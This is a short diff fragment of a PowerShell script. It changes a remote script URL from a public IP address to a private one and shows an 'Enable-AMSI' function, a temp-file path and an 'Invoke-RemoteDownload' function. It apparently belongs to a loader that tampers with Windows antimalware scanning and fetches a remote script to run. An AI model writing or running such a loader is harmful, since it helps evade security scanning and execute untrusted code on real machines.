@@ -12,7 +12,7 @@ function Enable-AMSI {
     }
 }
 
-\$scriptUrl = "http://20.211.55.5:8000/try.ps1"
+\$scriptUrl = "http://10.211.55.5:8000/try.ps1"
 $tempOutputPath = Join-Path $env:TEMP "downloaded_script.ps1"
 
 function Invoke-RemoteDownload {
